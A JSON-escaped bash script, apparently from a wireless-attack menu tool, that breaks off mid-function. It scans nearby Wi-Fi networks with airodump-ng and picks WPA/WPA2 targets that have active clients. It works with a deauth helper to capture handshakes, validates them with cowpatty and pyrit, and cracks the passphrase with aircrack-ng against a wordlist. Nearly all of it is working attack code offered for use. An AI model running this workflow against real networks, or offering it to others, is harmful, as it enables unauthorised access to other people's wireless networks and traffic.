          "content": "#! /bin/bash\nWLANNM=$(cat /root/lscript/wlanmon.txt)\nexport WLANNM\n#-----------------FUNCTIONS-----------------\nfunction defaults_lh1\n{\n#path for lscript\n\tLPATH=\"/root/lscript\"\n\texport LPATH\n#path for keyboard shortcuts\n\tKSPATH=\"\"$LPATH\"/ks\"\n\texport KSPATH\n#making sure the kspath is set\n\tif [[ ! -d \"$KSPATH\" ]]\n\tthen\n\t\tmkdir \"$KSPATH\"\n\tfi\n#ALFA SUPPORT SETTING\n\tif [[ -f \"$LPATH\"/settings/AWUS036ACH.txt ]]\n\tthen\n\t\tread ALFA < \"$LPATH\"/settings/AWUS036ACH.txt\n\telse\n\t\tALFA=\"no\"\n\tfi\n#yellow start \n\tYS=\"\\e[1;33m\"\n#blue start \n\tBS=\"\\e[0;34m\"\n#color end\n\tCE=\"\\e[0m\"\n#red start\n\tRS=\"\\e[1;31m\"\n#black start\n\tBLS=\"\\e[0;30m\"\n#dark gray start\n\tDGYS=\"\\e[1;30m\"\n#light blue start\n\tLBS=\"\\e[1;34m\"\n#green start\n\tGNS=\"\\e[0;32m\"\n#light green start\n\tLGNS=\"\\e[1;32m\"\n#cyan start\n\tCYS=\"\\e[0;36m\"\n#light cyan start\n\tLCYS=\"\\e[1;36m\"\n#light red start\n\tDRS=\"\\e[0;31m\"\n#purple start\n\tPS=\"\\e[0;35m\"\n#light purple start\n\tLPS=\"\\e[1;35m\"\n#brown start\n\tBRS=\"\\e[0;33m\"\n#light gray start\n\tLGYS=\"\\e[0;37m\"\n#white start\n\tWHS=\"\\e[1;37m\"\n#setting custom color for logo\n\tif [[ -f \"$LPATH\"/settings/logocolor.txt ]]\n\tthen\n\t\tread COL < \"$LPATH\"/settings/logocolor.txt\n\telse\n\t\tCOL=\"$RS\"\n\tfi\n#setting frequent stings\n\tYNYES=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=yes)\"\n\tYNNO=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")(\"$YS\"Enter\"$CE\"=no)\"\n\tYNONLY=\"(\"$YS\"y\"$CE\"/\"$YS\"n\"$CE\")\"\n\tPAKT=\"Press \"$YS\"any key$CE to\"\n\tPAKTC=\"Press \"$YS\"any key$CE to continue...\"\n\tPAKTGB=\"Press \"$YS\"any key$CE to go back...\"\n\tTNI=\"\"$RS\"Tool is not installed. To install it type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"'.\"$CE\"\"\n#code to read from keyboard without return\n\tREADAK=\"read -n 1\"\n#default MAC when starting monitor\n\tDEFMAC=\"00:11:22:33:44:55\"\n\t\n\twififb=\"wififb\"\n}\nfunction dash_calc\n{\n\t\n\tsize=${#TERMINALTITLE}\n\tcalc=$(( 65-size ))\n\tcalc=$(( calc/2 ))\n\tnumcalc=1\n\tDASHESN=\"-\"\n\twhile [ $numcalc != $calc ]\n\tdo\n\t\tDASHESN=\"\"$DASHESN\"-\"\n\t\tnumcalc=$(( numcalc+1 ))\n\tdone\n\techo -e \"$DASHESN\"$RS\"$TERMINALTITLE\"$CE\"$DASHESN\"\n}\nfunction scan_networks\n{\nif [[ \"$TARGB\" = \"\" ]]\nthen\n\tpre_scan\nelse\n\tap_sort_and_choose\n\tif [[ \"$APCHOOSE\" = \"r\" ]]\n\tthen\n\t\tTARGB=\"\"\n\t\tpre_scan\n\telif [[ \"$APCHOOSE\" = \"back\" || \"$APCHOOSE\" = \"b\" ]]\n\tthen\n\t\tbreak\n\tfi\t\nfi\n}\nfunction start_capture\n{\nexport HANDF\nif [[ \"$HANDF\" != \"0\" && \"$HANDF\" != \"deauth\" ]]\nthen\n\tif [[ -f \"$HANDCAP\" ]]\n\tthen\n\t\trm $HANDCAP\n\tfi\n\tgnome-terminal -q --geometry 70x10+0+0 -- lh2\n\tHANDFORDEAUTH=\"/root/handshakes/$HANDF-01.csv\"\n\texport HANDFORDEAUTH\n\tairodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM # & jobs -p > /root/lscript/dpidd.txt\n\t#~ airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM\n\t#kill the deauth menu if running\n\tif [[ -f \"$LPATH\"/dpid.txt ]]\n\tthen\n\t\tread DPID < \"$LPATH\"/dpid.txt\n\t\tPIF=$(ps -A | grep \"$DPID\")\n\t\tif [[ \"$PIF\" != \"\" ]]\n\t\tthen\n\t\t\tkill $DPID\n\t\tfi\n\tfi\n\t#kill the autochecker for handshake if running\n\tif [[ -f \"$LPATH\"/dpiddd.txt ]]\n\tthen\n\t\tread DPID < \"$LPATH\"/dpiddd.txt\n\t\tPIF=$(ps -A | grep \"$DPID\")\n\t\tif [[ \"$PIF\" != \"\" ]]\n\t\tthen\n\t\t\tkill $DPID\n\t\tfi\n\tfi\n\tif [[ -f \"/root/lscript/dpid*.txt\" ]]\n\tthen\n\t\trm /root/lscript/dpid*.txt\n\tfi\n\tvalidhandshake\n\texec bash \"$0\"\nelse\n\tif [[ -f /root/handshakes/deauth-01.csv || -f /root/handshakes/deauth-01.cap || -f /root/handshakes/deauth-01.kismet.csv || -f /root/handshakes/deauth-01.kismet.netxml ]]\n\tthen\n\t\trm -f /root/handshakes/deauth-01.*\n\tfi\n\tHANDF=\"deauth\"\n\tHANDFORDEAUTH=\"/root/handshakes/deauth-01.csv\"\n\tgnome-terminal -q --geometry 70x10+0+0 -- lh2\n\tairodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM\n\tif [[ -f \"$LPATH\"/dpid.txt ]]\n\tthen\n\t\tread DPID < \"$LPATH\"/dpid.txt\n\t\tPIF=$(ps -A | grep \"$DPID\")\n\t\tif [[ \"$PIF\" != \"\" ]]\n\t\tthen\n\t\t\tkill $DPID\n\t\tfi\n\tfi\n\techo -e \"Start capturing on a file?\"$YNYES\"\"\n\tread SCF\n\tif [[ \"$SCF\" = \"n\" ]]\n\tthen\n\t\tclear\n\t\texec bash \"$0\"\n\telse\n\t\twhile true\n\t\tdo\n\t\t\tclear\n\t\t\techo -e \"Enter the name of the handshake file(no extension): \"\n\t\t\tread -e HANDF\n\t\t\tif [[ ! -f \"/root/handshakes/$HANDF-01.cap\" ]]\n\t\t\tthen\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\techo -e \"\"$RS\"File already exists.\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\tdone\n\t\tHANDFFP=\"/root/handshakes/$HANDF-01.cap\"\n\t\texport HANDFFP\n\t\tif [[ -f \"$HANDFFP\" ]]\n\t\tthen\n\t\t\trm $HANDFFP\n\t\tfi\n\t\tgnome-terminal -q --geometry 70x10+0+0 -- lh2\n\t\tairodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM\n\t\tif [[ -f \"$LPATH\"/dpid.txt ]]\n\t\tthen\n\t\t\tread DPID < \"$LPATH\"/dpid.txt\n\t\t\tPIF=$(ps -A | grep \"$DPID\")\n\t\t\tif [[ \"$PIF\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tkill $DPID\n\t\t\tfi\n\t\tfi\n\t\tif [[ -f \"/root/lscript/dpid*.txt\" ]]\n\t\tthen\n\t\t\trm /root/lscript/dpid*.txt\n\t\tfi\n\t\tvalidhandshake\n\t\texec bash \"$0\"\n\tfi\nfi\n}\nfunction autoapselect\n{\nfile=\"/root/lscript/tempairodump-01.csv\"\nif [[ -f \"$file\" ]]\nthen\n\tlines=$(cat $file | awk '/WPA|WPA2|OPN|WEP/ {print}' | awk 'END{print NR}')\n\t#add safety-lines\n\tlines=$((lines+10))\nelse\n\tlines=0\nfi\nn2=1\npower=100\nif [[ \"$lines\" != 0 ]]\nthen\n\twhile [ $n2 -le \"$lines\" ]\n\tdo\n\t\tn3=$((n2+2))\n\t\t##apower[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /WPA|WPA2/)print $8}') BEFORE UPDATE\n\t\tapower[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /WPA|WPA2/)print $9}')\n\t\taopen[$n2]=0\n\t\tif [[ ${apower[$n2]} = \"\" ]]\n\t\tthen\n\t\t\taopen[$n2]=1\n\t\t\tapower[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $9}')\n\t\tfi\n\t\tadata[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $11}')\n\t\tif [[ ${adata[$n2]} = \"\" ]]\n\t\tthen\n\t\t\tadata[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $11}')\n\t\tfi\n\t\t#aessid[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $19}') not working in latest 1.5.2 update\n\t\taessid[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $14}')\n\t\tif [[ ${aessid[$n2]} = \"\" ]]\n\t\tthen\n\t\t\taessid[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $14}')\n\t\tfi\n\t\tachannel[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $4}')\n\t\tif [[ ${achannel[$n2]} = \"\" ]]\n\t\tthen\n\t\t\tachannel[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $4}')\n\t\tfi\n\t\tamac[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"} {if(NR==nn && /WPA|WPA2/)print $1}')\n\t\tif [[ ${amac[$n2]} = \"\" ]]\n\t\tthen\n\t\t\tamac[$n2]=$(cat $file | awk -v nn=\"$n3\" '{FS=\", \"}{if(NR==nn && /OPN|WEP/)print $1}')\n\t\tfi\n\t\tpowerunfixed=\"${apower[$n2]}\"\n\t\tapowerfixed[$n2]=\"$powerunfixed\"\n\t\tapowerfixed[$n2]=$((power+apowerfixed[$n2]))\n\t\t#echo \"\"$n2\") \"${apowerfixed[$n2]}\"% \"${amac[$n2]}\" \"${achannel[$n2]}\" \"${adata[$n2]}\" \"${aessid[$n2]}\"\"\n\t\t###DEBUGGING\n\t\t#~ echo -e \"n2=\"$n2\" ${aessid[$n2]}\"\n\t\tn2=$(( n2+1 ))\n\tdone\n\tn3=1\n\twhile [ $n3 -le \"$lines\" ]\n\tdo\n\t\tn=1\n\t\ttopsignal=100\n\t\twhile [[ \"$n\" -le \"$lines\" ]]\n\t\tdo\n\t\t\tif [[ \"${apowerfixed[$n]}\" -le \"$topsignal\" ]]\n\t\t\tthen\n\t\t\t\tlowestn=\"$n\"\n\t\t\t\ttopsignal=\"${apowerfixed[$n]}\"\t\t\t\t\n\t\t\tfi\n\t\t\tn=$((n+1))\n\t\tdone \n\t\tzn[$n3]=$lowestn\n\t\tzopen[$n3]=${aopen[$lowestn]}\n\t\tzdata[$n3]=${adata[$lowestn]}\n\t\tzessid[$n3]=${aessid[$lowestn]}\n\t\tzpowerfixed[$n3]=${apowerfixed[$lowestn]}\n\t\tzmac[$n3]=${amac[$lowestn]}\n\t\tzchannel[$n3]=${achannel[$lowestn]}\n\t\tapowerfixed[$lowestn]=101\n\t\tn3=$((n3+1)) \n\tdone\n\tn3=1\n\techo -e \"\"$BS\"  BLUE\"$CE\"=OPEN NETWORK OR WEP PROTECTED\"\n\techo -e \"\"$YS\"YELLOW\"$CE\"=WPA/WPA2 NETWORK WITH ACTIVE CLIENTS\"\n\techo -e \"\"$RS\"   RED\"$CE\"=WPA/WPA2 NETWORK WITHOUT ACTIVE CLIENTS\"\n\techo -e \"_________________________________________________________________________________________\"\n\techo -e \"     POWER ESSID                                  MAC               CLIENTS  DATA\"\n\twhile [ $n3 -le \"$lines\" ]\n\tdo\n\t\t#fix for \\x00\\x00\\x00 bug on airodump:\n\t\t\tcheckbug=$(echo \"${zessid[$n3]}\" | grep \"\\x00\")\n\t\t\tif [[ \"$checkbug\" == \"\" ]]\n\t\t\tthen\n\t\t\t\tsize=\"${#zessid[$n3]}\"\n\t\t\telse\n\t\t\t\tzessidfixed=$(echo \"${zessid[$n3]}\" | cut -d '\\' -f1)\n\t\t\t\tsize=\"${#zessidfixed}\"\n\t\t\tfi\n\t\t##\n\t\t\n\t\t##calculating how many underscores needed for output\n\t\tcalc=$(( 40-size ))\n\t\tnumcalc=1\n\t\tSPACES=\"\"\n\t\twhile [[ \"$numcalc\" != \"$calc\" ]]\n\t\tdo\n\t\t\tSPACES=\"\"$SPACES\"_\"\n\t\t\tnumcalc=$(( numcalc+1 ))\n\t\tdone\n\t\tif [[ \"$n3\" -le 9 ]]\n\t\tthen\n\t\t\tnum=\" \"$n3\"\"\n\t\telse\n\t\t\tnum=$n3\n\t\tfi\n\t\tsize=${#zpowerfixed[$n3]}\n\t\tif [[ \"$size\" == 3 ]]\n\t\tthen\n\t\t\tspace=\"\"\n\t\telif [[ \"$size\" == 2 ]]\n\t\tthen\n\t\t\tspace=\" \"\n\t\telif [[ \"$size\" == 1 ]]\n\t\tthen\n\t\t\tspace=\"  \"\n\t\tfi\n\t\tDATAA=\" \"$RS\"0\"$CE\"\"\n\t\tif [[ ${zpowerfixed[$n3]} -lt 100 ]]\n\t\tthen\n\t\t\tsize2=${#zessid[$n3]}\n\t\t\tif [[ \"$size2\" -eq 36 ]]\n\t\t\tthen\n\t\t\t\tzessid[$n3]=\"____________________________________\"\n\t\t\tfi\n\t\t\tSTART=\"\"\n\t\t\tif [[ ${zopen[$n3]} = 1 ]]\n\t\t\tthen\n\t\t\t\tSTART=\"$BS\"\n\t\t\t\tif [[ ${zdata[$n3]} -gt 0 ]]\n\t\t\t\tthen\n\t\t\t\t\tCLIENTS=\"YES\"\n\t\t\t\t\tDATAA=\"${zdata[$n3]}\"\n\t\t\t\telse\n\t\t\t\t\tCLIENTS=\"NO \"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\tif [[ ${zdata[$n3]} -gt 0 ]]\n\t\t\t\tthen\n\t\t\t\t\tCLIENTS=\"YES\"\n\t\t\t\t\tSTART=\"$YS\"\n\t\t\t\t\tDATAA=\"${zdata[$n3]}\"\n\t\t\t\telse\n\t\t\t\t\tSTART=\"$RS\"\n\t\t\t\t\tCLIENTS=\"NO \"\n\t\t\t\tfi\n\t\t\tfi\n\t\t\techo -e \"\"$YS\"\"$num\"\"$CE\") \"$START\"${space}\"${zpowerfixed[$n3]}\"%   \"${zessid[$n3]}\"\"$SPACES\"\"${zmac[$n3]}\" \"$CLIENTS\"     \"$DATAA\"\"$CE\"\"\n\t\tfi\n\t\tn3=$((n3+1))\n\tdone\nelse\n\techo -e \"\"$RS\"No networks found nearby.\"$CE\"\"\nfi\necho -e \"\"$YS\" r\"$CE\") rescan\"\necho -e \"\"$YS\" b\"$CE\") Go back\"\necho -e \"Choose: \"\n}\nfunction capture_again\n{\n\t\t\techo -e \"Capture handshake again on the same network? \"$YNYES\"\"\n\t\t\tread CAGAIN\n\t\t\tif [[ ! \"$CAGAIN\" = \"n\" ]]\n\t\t\tthen\n\t\t\t\tgnome-terminal -q --geometry 70x10+0+0 -- lh2\n\t\t\t\tairodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM\n\t\t\t\tvalidhandshake\n\t\t\t\texec bash \"$0\"\n\t\t\tfi\n}\nfunction ap_sort_and_choose\n{\nwhile true\ndo\n\tclear\n\tautoapselect\n\tread APCHOOSE\n\tclear\n\tif [[ \"$APCHOOSE\" = \"back\" || \"$APCHOOSE\" = \"b\" ]]\n\tthen\n\t\tbreak\n\telif [[ \"$APCHOOSE\" = \"r\" ]]\n\tthen\n\t\tJC=0\n\t\tbreak\n\telif [[ \"$APCHOOSE\" -le \"$lines\" && \"$APCHOOSE\" -ge 1 ]]\n\tthen\n\t\tif [[ ${zopen[$APCHOOSE]} = 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"You selected an open or a WEP protected network.Please select a WPA/WPA2 protected network.\"$CE\"\"\n\t\t\techo -e \"Press \"$YS\"enter\"$CE\" to go back\"\n\t\t\tread\n\t\t\tbreak\n\t\tfi\n\t\tTARGB=\"${zmac[$APCHOOSE]}\"\n\t\tTARGC=\"${zchannel[$APCHOOSE]}\"\n\t\tTARGE=\"${zessid[$APCHOOSE]}\"\n\t\twhile true\n\t\tdo\n\t\t\tclear\n\t\t\techo -e \"Enter the name of the handshake file(no extention)(e.g: \"$YS\"hand1\"$CE\")\"\n\t\t\techo -e \"Type \"$YS\"\"0\"\"$CE\" for no file\"\n\t\t\tread -e HANDF\n\t\t\tif [[ \"$HANDF\" = 0 ]]\n\t\t\tthen\n\t\t\t\tif [[ -f /root/handshakes/deauth-01.csv || -f /root/handshakes/deauth-01.cap || -f /root/handshakes/deauth-01.kismet.csv || -f /root/handshakes/deauth-01.kismet.netxml ]]\n\t\t\t\tthen\n\t\t\t\t\trm -f /root/handshakes/deauth-01.*\n\t\t\t\tfi\n\t\t\t\tHANDF=\"deauth\"\n\t\t\t\tHANDFORDEAUTH=\"/root/handshakes/deauth-01.csv\"\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\tif [[ ! -f \"/root/handshakes/$HANDF-01.csv\" ]]\n\t\t\t\tthen\n\t\t\t\t\tHANDFORDEAUTH=\"/root/handshakes/$HANDF-01.csv\"\n\t\t\t\t\tbreak\n\t\t\t\telse\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"\"$RS\"File already exists.\"$CE\"\"\n\t\t\t\t\tsleep 2\n\t\t\t\t\tcontinue\t\n\t\t\t\tfi\t\t\t\t\n\t\t\tfi\n\t\tdone\n\t\tHANDFFP=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\tHANDCAP=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\texport HANDFORDEAUTH\n\t\texport HANDCAP\n\t\texport HANDFFP\n\t\texport HANDF\n\t\texport TARGB\n\t\texport TARGC\n\t\texport TARGE\n\t\tclear\n\t\tstart_capture\n\t\tbreak\n\tfi\ndone\n}\nfunction pre_scan\n{\nwhile true\ndo\n\tif [[ \"$JC\" != 1 ]]\n\tthen\n\t\tremove_temps\n\t\techo -e \"Select what to scan: \"\n\t\techo -e \"\"$YS\"ENTER\"$CE\") All channels\"\n\t\techo -e \" \"$YS\"1\"$CE\"-\"$YS\"13\"$CE\") Specific channel\"\n\t\techo -e \"\"$YS\"    b\"$CE\") Go back\"\n\t\tread CHANNELSL\n\t\tif [[ \"$CHANNELSL\" = \"\" ]]\n\t\tthen\n\t\t\tFJC=0\n\t\t\tJC=1\n\t\t\tairodump-ng $WLANNM -w /root/lscript/tempairodump\n\t\telif [[ \"$CHANNELSL\" = \"back\" || \"$CHANNELSL\" = \"b\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\tCH=\"0\"\n\t\t\tbreak\n\t\telse\n\t\t\tFJC=0\n\t\t\tJC=1\n\t\t\tairodump-ng -c $CHANNELSL $WLANNM -w /root/lscript/tempairodump\n\t\tfi\n\tfi\n\t\tap_sort_and_choose\n\t\tif [[ \"$APCHOOSE\" = \"r\" ]]\n\t\tthen\n\t\t\tJC=0\n\t\t\tcontinue\n\t\telif [[ \"$APCHOOSE\" = \"back\" || \"$APCHOOSE\" = \"b\" ]]\n\t\tthen\n\t\t\tbreak\n\t\tfi\t\n\tdone\n}\nfunction remove_temps\n{\n\t\trm -f /root/lscript/tempairodump*\t\t\n\t\trm -f /root/lscript/dpid*.txt\n}\nfunction validate_with_pyrit\n{\n\tclear\n\techo -e \"Checking handshake with pyrit...\"\n\tTEMP=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null) \n\tTEMPHAND=$(echo \"$TEMP\" | grep \"No valid EAOPL-handshake + ESSID detected.\")\n\tclear\n\tif [[ \"$TEMPHAND\" = \"\" ]]\n\tthen\n\t\tVALIDH=1\n\t\t#TEMPHANDD=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null | grep \"good\")\n\t\tTEMPHANDD=$(echo \"$TEMP\" | grep \"good\")\n\t\tif [[ \"$TEMPHANDD\" = \"\" ]]\n\t\tthen\n\t\t\tTEMPHAD=$(echo \"$TEMP\" | grep \"workable\")\n\t\t\tif [[ \"$TEMPHAD\" = \"\" ]]\n\t\t\tthen\t\n\t\t\t\t#TEMPHANDDD=$(pyrit -r \"$HANDCAP\" analyze 2>/dev/null | grep \"bad\")\n\t\t\t\tTEMPHANDDD=$(echo \"$TEMP\" | grep \"bad\")\n\t\t\t\tif [[ \"TEMPHANDDD\" = \"\" ]]\n\t\t\t\tthen\n\t\t\t\t\techo -e \"Handshake found!(Status: \"$RS\"unknown\"$CE\")\"\n\t\t\t\telse\n\t\t\t\t\techo -e \"Handshake found!(Status: \"$RS\"bad\"$CE\")\"\n\t\t\t\tfi\n\t\t\t\techo -e \"\"\n\t\t\t\techo -e \"Do you want to keep it?\"$YNNO\": \"\n\t\t\t\tread KORD\n\t\t\t\tif [[ \"$KORD\" = \"y\" ]]\n\t\t\t\tthen\n\t\t\t\t\tVALIDH=1\n\t\t\t\telse\n\t\t\t\t\tVALIDH=0\n\t\t\t\tfi\n\t\t\t\tsleep 0.1\n\t\t\telse\n\t\t\t\techo -e \"Handshake found!(Status: \"$RS\"workable\"$CE\")\"\n\t\t\tfi\t\t\t\n\t\telse\n\t\t\techo -e \"Valid handshake found!(Status: \"$YS\"good\"$CE\")\"\n\t\t\tsleep 3\n\t\tfi\n\telse\n\t\tVALIDH=0\n\t\techo -e \"\"$RS\"No handshake found.\"$CE\"\"\n\t\tsleep 2\n\tfi\n}\nfunction validate_with_cowpatty\n{\n\tclear\n\techo -e \"Checking handshake with cowpatty...\"\n\tsleep 1\n\tTEMPHAND=$(cowpatty -c -r \"$HANDCAP\" | grep \"Collected all necessary data to mount crack against WPA2/PSK passphrase.\")\n\tclear\n\tif [[ \"$TEMPHAND\" = \"\" ]]\n\tthen\n\t\tVALIDH=0\n\t\techo -e \"\"$RS\"No handshake found\"$CE\"\"\n\t\tsleep 1\n\t\techo -e \"\"\n\t\techo -e \"Do you want to check it with pyrit? \"$YNYES\": \"\n\t\tread CWP\n\t\tif [[ \"$CWP\" = \"n\" ]]\n\t\tthen\n\t\t\tVALIDH=0\n\t\telse\n\t\t\tvalidate_with_pyrit\n\t\tfi\n\telse\n\t\tVALIDH=1\n\t\techo -e \"\"$YS\"Valid handshake found!\"$CE\"\"\n\t\tsleep 2\n\tfi\n}\nfunction handshake_clean\n{\n\tclear\n\tpyrit -r $HANDCAP -o /root/handshakes/\"$HANDF\"-cleaned.cap strip && echo -e \"CLEANED\"\n\tsleep 2\n}\nfunction validhandshake\n{\necho -e \"Did you capture the handshake?\"$YNYES\"\"\nread HANDVALID\nif [[ \"$HANDVALID\" = \"n\" ]]\nthen\n\techo -e \"Removing the file...\"\n\tsleep 2\n\trm /root/handshakes/\"$HANDF\"-01*\n\t#~ remove_temps\n\tFJC=0\nelse\n\tFJC=1\n\tHANDCAP=/root/handshakes/\"$HANDF\"-01.cap\n\tvalidate_with_cowpatty\n\tif [[ \"$VALIDH\" = \"0\" ]]\n\tthen\n\t\tFJC=0\n\t\techo -e \"Couldn't validate your handshake. Delete it? \"$YNYES\"\"\n\t\tread NOVALDEL\n\t\tif [[ ! \"$NOVALDEL\" = \"n\" ]]\n\t\tthen\n\t\t\trm /root/handshakes/\"$HANDF\"-01.*\n\t\t\tclear\n\t\t\tcapture_again\n\t\tfi\n\telse\n\t\tclear\n\t\techo -e \"Do you want to clean your handshake?\"$YNYES\"\"\n\t\tread HANDCC\n\t\tclear\n\t\tif [[ \"$HANDCC\" = \"n\" ]]\n\t\tthen\n\t\t\techo -e \"Your handshake file is saved in: /root/handshakes/\"$HANDF\"-01.cap\"\n\t\t\tCTD=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\telse\n\t\t\tpyrit -r $HANDCAP -o /root/handshakes/\"$HANDF\"-cleaned.cap strip && echo -e \"Your handshake is now cleaned! You can find it at: /root/handshakes/\"$HANDF\"-cleaned.cap\"\n\t\t\tCTD=\"/root/handshakes/$HANDF-cleaned.cap\"\n\t\tfi\n\t\techo -e \"\"\n\t\techo -e \"Do you want to copy the handshake file to Desktop?\"$YNYES\"\"\n\t\tread CTDQ\n\t\tif [[ ! \"$CTDQ\" == \"n\" ]]\n\t\tthen\n\t\t\tcp \"$CTD\" /root/Desktop\n\t\t\techo -e \"\"$YS\"Done!\"$CE\"\"\n\t\t\tsleep 1\n\t\tfi\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\tfi\n\t\t\t\nfi\nclear\n}\nfunction capture_handshake\n{\nwhile true\ndo\n\tAA=-1\n\tclear\n\techo -e \"\"$YS\" 1\"$CE\") Use selected: $TARGE\"\n\techo -e \"\"$YS\" 2\"$CE\") Set another BSSID and CHANNEL\"\n\techo -e \"\"$YS\" r\"$CE\") Scan again\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"Choose: \"\n\tread CAPTH\n\tif [[ \"$CAPTH\" = \"back\" || \"$CAPTH\" = \"b\" ]]\n\tthen\n\t\tbreak\n\telif [[ \"$CAPTH\" = \"2\" ]]\n\tthen\n\t\techo -e \"Enter your target's bssid: \"\n\t\tread -e TARGB\n\t\techo -e \"Enter your target's channel: \"\n\t\tread -e TARGC\n\t\techo -e \"Enter the name of the handshake file(no extension): \"\n\t\techo -e \"(don't use the same name twice)\"\n\t\techo -e \"Type \"$YS\"\"0\"\"$CE\" for no file\"\n\t\tread -e HANDF\n\t\tTARGE=\"\"\n\t\tHANDFFP=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\tHANDCAP=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\texport HANDCAP\n\t\texport HANDFFP\n\t\texport TARGB\n\t\texport TARGC\n\t\texport TARGE\n\t\tclear\n\t\tstart_capture\n\t\tbreak\n\telif [[ \"$CAPTH\" = \"r\" ]]\n\tthen\t\n\t\tscan_networks\n\t\tbreak\n\telif [[ \"$CAPTH\" = \"1\" ]]\n\tthen\n\t\tif [[ \"$TARGE\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"No network selected.Start scanning and select your target.\"\n\t\t\tsleep 4\n\t\t\tbreak\n\t\telse\n\t\t\techo -e \"Enter the name of the handshake file(no extension): \"\n\t\t\techo -e \"(don't use the same name twice)\"\n\t\t\techo -e \"Type \"$YS\"\"0\"\"$CE\" for no file\"\n\t\t\tread -e HANDF\n\t\t\tTARGE=\"\"\n\t\t\tHANDFFP=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\t\tHANDCAP=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\t\tHANDFORDEAUTH=\"/root/handshakes/\"$HANDF\"-01.cap\"\n\t\t\texport HANDCAP\n\t\t\texport HANDFFP\n\t\t\tclear\n\t\t\tstart_capture\n\t\t\tbreak\n\t\tfi\n\tfi\ndone\n}\nfunction aircrack_handshakejust\n{\n\tclear\n\techo -e \"Do you want to use the file you just captured?\"$YNYES\": \"\n\tread -e YORN\n\tclear\n\tif [[ \"$YORN\" = \"n\" ]]\n\tthen\n\t\tcd /root/handshakes\n\t\tls | sort\n\t\tcd\n\t\techo -e \"Enter handshake name(no extension)(on folder /root/handshakes/): \"\n\t\tread -e HANDFK\n\t\tHANDFFK=\"/root/handshakes/$HANDFK-01.cap\"\n\t\tif [[ -f \"$HANDFFK\" ]]\n\t\tthen\n\t\t\techo -e \"OK.\"\n\t\t\tHANDFFP=\"$HANDFFK\"\n\t\t\tsleep 1\n\t\t\tclear\n\t\telse\n\t\t\techo -e \"File $HANDFK does not exist\"\n\t\t\tsleep 2\n\t\t\tclear\n\t\t\texec bash \"$0\"\n\t\tfi\n\t\tcd /root/wordlists\n\t\tls | sort\n\t\tcd\n\t\techo -e \"Enter wordlist name(include extension)(on folder /root/wordlists/): \"\n\t\tread -e WORDF\n\t\tWORDFF=\"/root/wordlists/$WORDF\"\n\t\tif [[ -f \"$WORDFF\" ]]\n\t\tthen\n\t\t\techo -e \"OK.\"\n\t\t\tsleep 1\n\t\t\tclear\n\t\telse\n\t\t\techo -e \"File $WORDF does not exist\"\n\t\t\tsleep 2\n\t\t\tclear\n\t\t\texec bash \"$0\"\n\t\tfi\n\telse\n\t\tcd /root/wordlists\n\t\tls | sort\n\t\tcd\n\t\techo -e \"Enter wordlist name(include extension)(on folder /root/wordlists/): \"\n\t\tread -e WORDF\n\t\tWORDFF=\"/root/wordlists/$WORDF\"\n\t\tif [[ -f \"$WORDFF\" ]]\n\t\tthen\n\t\t\techo -e \"OK.\"\n\t\t\tsleep 1\n\t\telse\n\t\t\techo -e \"File $WORDF does not exist\"\n\t\t\tsleep 2\n\t\t\tclear\n\t\t\texec bash \"$0\"\n\t\tfi\n\tfi\n\tclear\n\taircrack-ng -w $WORDFF $HANDFFP\n\techo -e \"$PAKTGB\"\n\t$READAK\n}\nfunction aircrack_handshake\n{\n\tclear\n\tcd /root/handshakes\n\tls | sort\n\tcd\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"Enter handshake name(include extension)(on folder /root/handshakes/): \"\n\tread -e HANDFT\n\tif [[ \"$HANDFT\" = \"back\" || \"$HANDFT\" = \"b\" ]]\n\tthen\n\t\tclear\n\t\texec bash $0\n\tfi\n\tHANDFFT=\"/root/handshakes/$HANDFT\"\n\tif [[ -f \"$HANDFFT\" 